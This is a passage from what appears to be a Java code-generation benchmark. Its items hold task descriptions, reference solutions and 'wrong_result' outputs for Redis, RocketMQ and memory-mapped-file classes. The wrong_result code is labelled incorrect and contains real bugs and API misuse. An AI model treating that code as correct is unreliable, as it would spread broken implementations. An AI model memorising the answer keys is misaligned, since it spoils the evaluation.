    "wrong_result": "public class RedisConnectionManager {\n    private JedisPool jedisPool;\n    private GenericObjectPoolConfig<Connection> poolConfig;\n    private DefaultJedisClientConfig clientConfig;\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig) {\n        this.poolConfig = new GenericObjectPoolConfig<>();\n        this.clientConfig = clientConfig;\n        this.jedisPool = new JedisPool(clientConfig, hostAndPort.getHost(), hostAndPort.getPort());\n    }\n\n    public RedisConnectionManager(HostAndPort hostAndPort, DefaultJedisClientConfig clientConfig, GenericObjectPoolConfig<Connection> poolConfig) {\n        this.poolConfig = poolConfig;\n        this.clientConfig = clientConfig;\n        this.jedisPool = new JedisPool(poolConfig, clientConfig, hostAndPort.getHost(), hostAndPort.getPort());\n    }\n\n    public Connection getConnection() {\n        return jedisPool.getResource();\n    }\n\n    public void closeConnection(Connection connection) {\n        jedisPool.returnResource(connection);\n    }\n\n    public void setCredentialsProvider(RedisCredentialsProvider credentialsProvider) {\n        clientConfig.setPassword(credentialsProvider.getPassword());\n    }\n\n    public void executeCommand(String key, String value) {\n        Connection connection = getConnection();\n        try {\n            ((Jedis) connection).set(key, value);\n        } finally {\n            closeConnection(connection);\n        }\n    }\n\n    public String getValue(String key) {\n        Connection connection = getConnection();\n        try {\n            return ((Jedis) connection).get(key);\n        } finally {\n            closeConnection(connection);\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 356,
    "Instruction": "Task Description: Implement a Redis Sentinel connection provider class in Java that manages connections to a Redis master node through Sentinel monitoring, including automatic failover handling.\n\nClass Description: SentineledConnectionProvider is a class that provides managed connections to a Redis master node in a Sentinel-monitored environment. It automatically discovers the current master through Sentinel nodes and maintains a connection pool to it. The class also includes a listener thread that monitors for master failover events and updates the connection pool accordingly.\n\nAttributes:\n- currentMaster: [HostAndPort] - The current master node's host and port\n- pool: [ConnectionPool] - The connection pool to the current master node\n- masterName: [String] - The name of the Redis master as configured in Sentinel\n- masterClientConfig: [JedisClientConfig] - Configuration for connections to the master node\n- sentinelClientConfig: [JedisClientConfig] - Configuration for connections to Sentinel nodes\n\nMethods:\n- SentineledConnectionProvider([String] masterName, [JedisClientConfig] masterClientConfig, [Set<HostAndPort>] sentinels, [JedisClientConfig] sentinelClientConfig) -> [void] - Constructor that initializes the connection provider with master name, configurations, and Sentinel nodes\n- getConnection() -> [Connection] - Retrieves a connection from the pool to the current master node\n- initMaster([HostAndPort] master) -> [void] - Initializes or updates the connection pool to the specified master node\n- initSentinels([Set<HostAndPort>] sentinels) -> [HostAndPort] - Discovers the current master node through Sentinel nodes\n- SentinelListener([HostAndPort] node) -> [void] - Nested class constructor for Sentinel listener thread\n- run() -> [void] - Main execution method of the Sentinel listener thread (overrides Thread.run())\n- shutdown() -> [void] - Shuts down the Sentinel listener thread",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\n\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class SentineledConnectionProvider {\n\n  private static final Logger LOG = LoggerFactory.getLogger(SentineledConnectionProvider.class);\n\n  private volatile HostAndPort currentMaster;\n  private volatile ConnectionPool pool;\n  private final String masterName;\n  private final JedisClientConfig masterClientConfig;\n  private final JedisClientConfig sentinelClientConfig;\n\n  public SentineledConnectionProvider(String masterName, final JedisClientConfig masterClientConfig,\n      Set<HostAndPort> sentinels, final JedisClientConfig sentinelClientConfig) {\n    this.masterName = masterName;\n    this.masterClientConfig = masterClientConfig;\n    this.sentinelClientConfig = sentinelClientConfig;\n\n    HostAndPort master = initSentinels(sentinels);\n    initMaster(master);\n  }\n\n  public Connection getConnection() {\n    return pool.getResource();\n  }\n\n  private void initMaster(HostAndPort master) {\n    if (!master.equals(currentMaster)) {\n      currentMaster = master;\n      pool = new ConnectionPool(currentMaster, masterClientConfig);\n      LOG.info(\"Created connection pool to master at {}.\", master);\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n\n    for (HostAndPort sentinel : sentinels) {\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n\n        if (masterAddr == null || masterAddr.size() != 2) {\n          continue;\n        }\n\n        master = new HostAndPort(masterAddr.get(0), Integer.parseInt(masterAddr.get(1)));\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Could not get master address from {}.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored.\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where \" + masterName + \" is running.\");\n      }\n    }\n\n    return master;\n  }\n\n  protected class SentinelListener extends Thread {\n    protected final HostAndPort node;\n    protected volatile Jedis sentinelJedis;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public SentinelListener(HostAndPort node) {\n      this.node = node;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n\n      while (running.get()) {\n        try {\n          sentinelJedis = new Jedis(node, sentinelClientConfig);\n          sentinelJedis.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3 && masterName.equals(switchMasterMsg[0])) {\n                initMaster(new HostAndPort(switchMasterMsg[3], Integer.parseInt(switchMasterMsg[4])));\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            try {\n              Thread.sleep(5000);\n            } catch (InterruptedException se) {\n              LOG.error(\"Sleep interrupted.\", se);\n            }\n          }\n        } finally {\n          IOUtils.closeQuietly(sentinelJedis);\n        }\n      }\n    }\n\n    public void shutdown() {\n      running.set(false);\n      if (sentinelJedis != null) {\n        sentinelJedis.close();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class SentineledConnectionProvider {\n    private final String masterName;\n    private final JedisClientConfig masterClientConfig;\n    private final JedisClientConfig sentinelClientConfig;\n    private final Set<HostAndPort> sentinels;\n    private HostAndPort currentMaster;\n    private JedisPool pool;\n    private Thread sentinelListener;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterClientConfig, Set<HostAndPort> sentinels, JedisClientConfig sentinelClientConfig) {\n        this.masterName = masterName;\n        this.masterClientConfig = masterClientConfig;\n        this.sentinels = sentinels;\n        this.sentinelClientConfig = sentinelClientConfig;\n        this.currentMaster = null;\n        this.pool = null;\n        this.sentinelListener = null;\n        initSentinels(sentinels);\n        startSentinelListener();\n    }\n\n    private HostAndPort initSentinels(Set<HostAndPort> sentinels) {\n        JedisSentinelPool sentinelPool = new JedisSentinelPool(masterName, sentinels, sentinelClientConfig);\n        List<String> masterAddr = sentinelPool.getMasterAddrByMasterName(masterName);\n        HostAndPort master = HostAndPort.newInstance(masterAddr.get(0), Integer.parseInt(masterAddr.get(1)));\n        sentinelPool.close();\n        return master;\n    }\n\n    private void initMaster(HostAndPort master) {\n        this.currentMaster = master;\n        this.pool = new JedisPool(masterClientConfig, master.getHost(), master.getPort());\n    }\n\n    public Connection getConnection() {\n        return pool.getResource();\n    }\n\n    public void shutdown() {\n        if (sentinelListener != null) {\n            sentinelListener.interrupt();\n        }\n        if (pool != null) {\n            pool.close();\n        }\n    }\n\n    private class SentinelListener extends Thread {\n        private final HostAndPort sentinelNode;\n\n        public SentinelListener(HostAndPort sentinelNode) {\n            this.sentinelNode = sentinelNode;\n        }\n\n        @Override\n        public void run() {\n            while (!isInterrupted()) {\n                try {\n                    Thread.sleep(5000);\n                    Jedis jedis = new Jedis(sentinelNode.getHost(), sentinelNode.getPort(), sentinelClientConfig.getConnectionTimeout(), sentinelClientConfig.getSoTimeout());\n                    List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n                    HostAndPort newMaster = HostAndPort.newInstance(masterAddr.get(0), Integer.parseInt(masterAddr.get(1)));\n                    if (!newMaster.equals(currentMaster)) {\n                        initMaster(newMaster);\n                    }\n                    jedis.close();\n                } catch (Exception e) {\n                    // Handle exceptions\n                }\n            }\n        }\n    }\n\n    private void startSentinelListener() {\n        HostAndPort firstSentinel = sentinels.iterator().next();\n        sentinelListener = new SentinelListener(firstSentinel);\n        sentinelListener.start();\n    }\n}"
  },
  {
    "Task_id": 357,
    "Instruction": "Task Description: Implement a Redis-based broadcast service for inter-process communication that allows sending and receiving messages between different instances of an application.\n\nClass Description: RedisBroadcastService is a class that provides publish-subscribe functionality using Redis as the message broker. It handles message serialization/deserialization and ensures messages are only processed by other instances (not the sender).\n\nAttributes:\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization of messages\n- executorService: ExecutorService - Handles message reception in a separate thread\n- channel: String - The Redis channel name for pub/sub communication\n- subscriber: Jedis - Redis client for subscribing to messages\n- publisher: Jedis - Redis client for publishing messages\n- id: String - Unique identifier for this service instance to avoid processing own messages\n\nMethods:\n- RedisBroadcastService(Config config, ExecutorService executorService, ObjectMapper objectMapper) -> void - Constructor that initializes Redis connections\n- sendMessage(BroadcastMessage message) -> void - Publishes a message to the Redis channel\n- start() -> void - Starts the message receiver in a separate thread\n- stop() -> void - Closes Redis connections and cleans up resources\n- receiver: Runnable - Internal thread that handles incoming messages from Redis",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport java.io.IOException;\nimport java.util.UUID;\nimport java.util.concurrent.ExecutorService;\n\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPubSub;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class RedisBroadcastService extends BaseBroadcastService {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisBroadcastService.class);\n\n    private final ObjectMapper objectMapper;\n    private final ExecutorService executorService;\n    private final String channel = \"traccar\";\n    private Jedis subscriber;\n    private Jedis publisher;\n    private final String id = UUID.randomUUID().toString();\n\n    public RedisBroadcastService(\n            Config config, ExecutorService executorService, ObjectMapper objectMapper) throws IOException {\n        this.executorService = executorService;\n        this.objectMapper = objectMapper;\n        String url = config.getString(Keys.BROADCAST_ADDRESS);\n\n        try {\n            subscriber = new Jedis(url);\n            publisher = new Jedis(url);\n            subscriber.connect();\n        } catch (JedisConnectionException e) {\n            throw new IOException(e);\n        }\n    }\n\n    @Override\n    protected void sendMessage(BroadcastMessage message) {\n        try {\n            String payload = id  + \":\" + objectMapper.writeValueAsString(message);\n            publisher.publish(channel, payload);\n        } catch (IOException | JedisConnectionException e) {\n            LOGGER.warn(\"Broadcast failed\", e);\n        }\n    }\n\n    @Override\n    public void start() throws IOException {\n        executorService.submit(receiver);\n    }\n\n    @Override\n    public void stop() {\n        try {\n            if (subscriber != null) {\n                subscriber.close();\n                subscriber = null;\n            }\n        } catch (JedisException e) {\n            LOGGER.warn(\"Subscriber close failed\", e);\n        }\n        try {\n            if (publisher != null) {\n                publisher.close();\n                publisher = null;\n            }\n        } catch (JedisException e) {\n            LOGGER.warn(\"Publisher close failed\", e);\n        }\n    }\n\n    private final Runnable receiver = new Runnable() {\n        @Override\n        public void run() {\n            try {\n                subscriber.subscribe(new JedisPubSub() {\n                    @Override\n                    public void onMessage(String messageChannel, String message) {\n                        try {\n                            String[] parts = message.split(\":\", 2);\n                            if (messageChannel.equals(channel) && parts.length == 2 && !id.equals(parts[0])) {\n                                handleMessage(objectMapper.readValue(parts[1], BroadcastMessage.class));\n                            }\n                        } catch (Exception e) {\n                            LOGGER.warn(\"Broadcast handleMessage failed\", e);\n                        }\n                    }\n                }, channel);\n            } catch (JedisException e) {\n                throw new RuntimeException(e);\n            }\n        }\n    };\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisBroadcastService {\n    private final ObjectMapper objectMapper;\n    private final ExecutorService executorService;\n    private final String channel;\n    private final Jedis subscriber;\n    private final Jedis publisher;\n    private final String id;\n\n    public RedisBroadcastService(Config config, ExecutorService executorService, ObjectMapper objectMapper) {\n        this.objectMapper = objectMapper;\n        this.executorService = executorService;\n        this.channel = config.getChannel();\n        this.subscriber = new Jedis(config.getHost(), config.getPort());\n        this.publisher = new Jedis(config.getHost(), config.getPort());\n        this.id = UUID.randomUUID().toString();\n    }\n\n    public void sendMessage(BroadcastMessage message) {\n        try {\n            String json = objectMapper.writeValueAsString(message);\n            publisher.publish(channel, json);\n        } catch (JsonProcessingException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        executorService.submit(this::receiver);\n    }\n\n    public void stop() {\n        subscriber.unsubscribe(channel);\n        publisher.close();\n        subscriber.close();\n        executorService.shutdown();\n    }\n\n    private void receiver() {\n        subscriber.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n                try {\n                    BroadcastMessage msg = objectMapper.readValue(message, BroadcastMessage.class);\n                    if (!msg.getSenderId().equals(id)) {\n                        // Process the message\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }, channel);\n    }\n}"
  },
  {
    "Task_id": 358,
    "Instruction": "Task Description: Create a Redis connection manager class that handles both standalone and cluster Redis connections with authentication support, including connection initialization, creation of different connection types, and proper resource cleanup.\n\nClass Description: The RedisConnectionManager class provides centralized management for Redis connections, supporting both standalone and cluster configurations with token-based authentication. It handles connection lifecycle management and provides methods to create different types of Redis connections.\n\nAttributes:\n\nclientOptions: [ClusterClientOptions] - Configuration options for Redis client connections\ncredentialsProvider: [TokenBasedRedisCredentialsProvider] - Provider for token-based authentication credentials\nclient: [RedisClient] - Client instance for standalone Redis connections\nclusterClient: [RedisClusterClient] - Client instance for Redis cluster connections\n\nMethods:\n\ninitializeConnection: [Name]([EntraIdTestContext testCtx]) -> [void] - Initializes Redis client instances with connection options and authentication configuration\ncreateStandaloneConnection: [Name]() -> [StatefulRedisConnection<String, String>] - Creates and returns a new standalone Redis connection\ncreateClusterConnection: [Name]() -> [StatefulRedisClusterConnection<String, String>] - Creates and returns a new Redis cluster connection\ncreatePubSubConnection: [Name]() -> [StatefulRedisPubSubConnection<String, String>] - Creates and returns a new Redis Pub/Sub connection\ncloseConnections: [Name]() -> [void] - Closes all active connections and releases resources",
    "Canonical_solution": "import io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.SocketOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport redis.clients.authentication.core.TokenAuthConfig;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\nimport redis.clients.authentication.core.TokenBasedRedisCredentialsProvider;\n\npublic class RedisConnectionManager {\n\n    private ClusterClientOptions clientOptions;\n    private TokenBasedRedisCredentialsProvider credentialsProvider;\n    private RedisClient client;\n    private RedisClusterClient clusterClient;\n\n    public void initializeConnection(EntraIdTestContext testCtx) {\n        clientOptions = ClusterClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(1)).build())\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        TokenAuthConfig tokenAuthConfig = EntraIDTokenAuthConfigBuilder.builder().clientId(testCtx.getClientId())\n                .secret(testCtx.getClientSecret()).authority(testCtx.getAuthority()).scopes(testCtx.getRedisScopes())\n                .expirationRefreshRatio(0.0000001F).build();\n\n        credentialsProvider = TokenBasedRedisCredentialsProvider.create(tokenAuthConfig);\n\n        RedisURI uri = RedisURI.builder().withHost(testCtx.host()).withPort(testCtx.port())\n                .withAuthentication(credentialsProvider).build();\n\n        client = RedisClient.create(uri);\n        client.setOptions(clientOptions);\n\n        RedisURI clusterUri = RedisURI.builder().withHost(testCtx.clusterHost().get(0)).withPort(testCtx.clusterPort())\n                .withAuthentication(credentialsProvider).build();\n        clusterClient = RedisClusterClient.create(clusterUri);\n        clusterClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return client.connect();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return clusterClient.connect();\n    }\n\n    public StatefulRedisPubSubConnection<String, String> createPubSubConnection() {\n        return client.connectPubSub();\n    }\n\n    public void closeConnections() {\n        if (credentialsProvider != null) {\n            credentialsProvider.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n        if (clusterClient != null) {\n            clusterClient.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisConnectionManager {\n    private final ClusterClientOptions clientOptions;\n    private final TokenBasedRedisCredentialsProvider credentialsProvider;\n    private RedisClient client;\n    private RedisClusterClient clusterClient;\n\n    public RedisConnectionManager(ClusterClientOptions clientOptions, TokenBasedRedisCredentialsProvider credentialsProvider) {\n        this.clientOptions = clientOptions;\n        this.credentialsProvider = credentialsProvider;\n    }\n\n    public void initializeConnection(EntraIdTestContext testCtx) {\n        client = RedisClient.create(clientOptions);\n        clusterClient = RedisClusterClient.create(clientOptions);\n        client.setOptions(clientOptions.toBuilder().password(credentialsProvider.getToken()).build());\n        clusterClient.setOptions(clientOptions.toBuilder().password(credentialsProvider.getToken()).build());\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return client.connect();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return clusterClient.connect();\n    }\n\n    public StatefulRedisPubSubConnection<String, String> createPubSubConnection() {\n        return client.connectPubSub();\n    }\n\n    public void closeConnections() {\n        if (client != null) {\n            client.shutdown();\n        }\n        if (clusterClient != null) {\n            clusterClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Implement a memory-mapped file-based key-value store for long-to-long mappings using Java NIO's FileChannel and MappedByteBuffer.\n\nClass Description: ArrayLongLongMapMmap provides a memory-efficient way to store and retrieve long-to-long mappings using memory-mapped files. It segments large files into manageable chunks for efficient random access.\n\nAttributes:\n- path: Path - The filesystem path where the memory-mapped file will be stored\n- writeChannel: FileChannel - Channel for writing to the file during initialization\n- segmentsArray: MappedByteBuffer[] - Array of memory-mapped buffers for reading data\n- readChannel: FileChannel - Channel for reading from the file after initialization\n\nMethods:\n- ArrayLongLongMapMmap(Path path, boolean madvise) - Constructor - Initializes the map with the given file path\n- init() -> void - Initializes the memory mapping by closing the write channel and opening read channels with segmented mappings\n- get(long key) -> long - Retrieves the value associated with the given key from memory-mapped segments\n- close() -> void - Cleans up resources including unmapping buffers and closing channels, then deletes the file\n\nThe implementation uses memory-mapped files (1<<27 byte segments) for efficient random access to large datasets while minimizing memory usage. The close() method ensures proper resource cleanup including buffer unmapping and file deletion.",
    "Canonical_solution": "import com.onthegomap.planetiler.util.ByteBufferUtil;\nimport com.onthegomap.planetiler.util.FileUtils;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.Semaphore;\n\nclass ArrayLongLongMapMmap {\n\n  private final Path path;\n  private FileChannel writeChannel;\n  private MappedByteBuffer[] segmentsArray;\n  private FileChannel readChannel = null;\n\n  ArrayLongLongMapMmap(Path path, boolean madvise) {\n    this.path = path;\n    try {\n      writeChannel = FileChannel.open(path, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  public void init() {\n    try {\n      writeChannel.close();\n      readChannel = FileChannel.open(path, StandardOpenOption.READ);\n      segmentsArray = ByteBufferUtil.mapFile(readChannel, readChannel.size(), 1L << 27, false, null);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  @Override\n  public long get(long key) {\n    long byteOffset = key << 3;\n    int idx = (int) (byteOffset >>> 27);\n    if (idx >= segmentsArray.length) {\n      return 0;\n    }\n    MappedByteBuffer mappedByteBuffer = segmentsArray[idx];\n    if (mappedByteBuffer == null) {\n      return 0;\n    }\n    int offset = (int) (byteOffset & ((1L << 27) - 1));\n    return mappedByteBuffer.getLong(offset);\n  }\n\n  @Override\n  public void close() throws IOException {\n    if (segmentsArray != null) {\n      ByteBufferUtil.free(segmentsArray);\n      segmentsArray = null;\n    }\n    if (writeChannel != null) {\n      writeChannel.close();\n      writeChannel = null;\n    }\n    if (readChannel != null) {\n      readChannel.close();\n      readChannel = null;\n    }\n    FileUtils.delete(path);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class ArrayLongLongMapMmap {\n    private final Path path;\n    private FileChannel writeChannel;\n    private MappedByteBuffer[] segmentsArray;\n    private FileChannel readChannel;\n\n    public ArrayLongLongMapMmap(Path path, boolean madvise) {\n        this.path = path;\n        try {\n            this.writeChannel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to create file channel\", e);\n        }\n    }\n\n    public void init() {\n        try {\n            writeChannel.close();\n            readChannel = FileChannel.open(path, StandardOpenOption.READ);\n            long fileSize = readChannel.size();\n            int numSegments = (int) (fileSize / (1L << 27));\n            segmentsArray = new MappedByteBuffer[numSegments];\n            for (int i = 0; i < numSegments; i++) {\n                long segmentStart = i * (1L << 27);\n                segmentsArray[i] = readChannel.map(FileChannel.MapMode.READ_ONLY, segmentStart, 1L << 27);\n            }\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to initialize memory mapping\", e);\n        }\n    }\n\n    public long get(long key) {\n        long entriesPerSegment = (1L << 27) / 16;\n        int segmentIndex = (int) (key / entriesPerSegment);\n        if (segmentIndex >= segmentsArray.length) {\n            throw new IllegalStateException(\"Segment out of bounds\");\n        }\n        long offsetWithinSegment = (key % entriesPerSegment) * 16;\n        MappedByteBuffer buffer = segmentsArray[segmentIndex];\n        long storedKey = buffer.getLong(offsetWithinSegment);\n        if (storedKey != key) {\n            throw new IllegalStateException(\"Key not found\");\n        }\n        return buffer.getLong(offsetWithinSegment + 8);\n    }\n\n    public void close() {\n        try {\n            if (segmentsArray != null) {\n                for (MappedByteBuffer buffer : segmentsArray) {\n                    buffer.force();\n                    buffer.clear();\n                }\n            }\n            if (readChannel != null) {\n                readChannel.close();\n            }\n            Files.delete(path);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to close resources\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 361,
    "Instruction": "Task Description: Implement a RocketMQ push consumer in Java that subscribes to a specific topic, processes incoming messages asynchronously, and manages consumer lifecycle operations.\n\nClass Description: LMQPushConsumer is a Java class that encapsulates the functionality of a RocketMQ push consumer. It handles the initialization, startup, and shutdown of the consumer, as well as message consumption from a specified topic using a concurrent message listener.\n\nAttributes:\n- CLUSTER_NAME: [String] - The name of the RocketMQ cluster\n- BROKER_NAME: [String] - The name of the broker\n- TOPIC: [String] - The parent topic name\n- LMQ_TOPIC: [String] - The specific LMQ topic to subscribe to\n- CONSUMER_GROUP: [String] - The consumer group identifier\n- NAMESRV_ADDR: [String] - The NameServer address\n- BROKER_ADDR_MAP: [HashMap<Long, String>] - Mapping of broker IDs to their addresses\n- consumer: [DefaultMQPushConsumer] - The RocketMQ push consumer instance\n\nMethods:\n- initialize(): [void] - Initializes the consumer with configuration settings, subscription, and message listener\n  - Input: None\n  - Output: None\n  - Throws: MQClientException if initialization fails\n- start(): [void] - Starts the consumer and updates topic route information\n  - Input: None\n  - Output: None\n  - Throws: MQClientException if startup fails\n- shutdown(): [void] - Shuts down the consumer gracefully\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import com.google.common.collect.Lists;\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.common.message.MessageQueue;\nimport org.apache.rocketmq.remoting.protocol.route.BrokerData;\nimport org.apache.rocketmq.remoting.protocol.route.TopicRouteData;\n\npublic class LMQPushConsumer {\n    public static final String CLUSTER_NAME = \"DefaultCluster\";\n    public static final String BROKER_NAME = \"broker-a\";\n    public static final String TOPIC = \"TopicLMQParent\";\n    public static final String LMQ_TOPIC = MixAll.LMQ_PREFIX + \"123\";\n    public static final String CONSUMER_GROUP = \"CID_LMQ_1\";\n    public static final String NAMESRV_ADDR = \"127.0.0.1:9876\";\n    public static final HashMap<Long, String> BROKER_ADDR_MAP = new HashMap<Long, String>() {\n        {\n            put(MixAll.MASTER_ID, \"127.0.0.1:10911\");\n        }\n    };\n\n    private DefaultMQPushConsumer consumer;\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                System.out.printf(\"%s Receive New Messages: %s %n\", Thread.currentThread().getName(), msgs);\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().updateTopicRouteInfoFromNameServer(TOPIC);\n\n        final TopicRouteData topicRouteData = new TopicRouteData();\n        final BrokerData brokerData = new BrokerData();\n        brokerData.setCluster(CLUSTER_NAME);\n        brokerData.setBrokerName(BROKER_NAME);\n        brokerData.setBrokerAddrs(BROKER_ADDR_MAP);\n        topicRouteData.setBrokerDatas(Lists.newArrayList(brokerData));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().getTopicRouteTable().put(LMQ_TOPIC, topicRouteData);\n        consumer.getDefaultMQPushConsumerImpl().updateTopicSubscribeInfo(LMQ_TOPIC,\n            new HashSet<>(Arrays.asList(new MessageQueue(LMQ_TOPIC, BROKER_NAME, (int) MixAll.LMQ_QUEUE_ID))));\n        consumer.getDefaultMQPushConsumerImpl().getmQClientFactory().doRebalance();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class LMQPushConsumer {\n    private String CLUSTER_NAME;\n    private String BROKER_NAME;\n    private String TOPIC;\n    private String LMQ_TOPIC;\n    private String CONSUMER_GROUP;\n    private String NAMESRV_ADDR;\n    private HashMap<Long, String> BROKER_ADDR_MAP;\n    private DefaultMQPushConsumer consumer;\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.setMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                for (MessageExt msg : msgs) {\n                    System.out.println(\"Received message: \" + new String(msg.getBody()));\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n    }\n\n    public void start() throws MQClientException {\n        try {\n            consumer.start();\n            consumer.updateTopicRouteInfoFromNameServer(TOPIC);\n        } catch (MQClientException e) {\n            throw new MQClientException(e.getMessage(), e);\n        }\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 362,
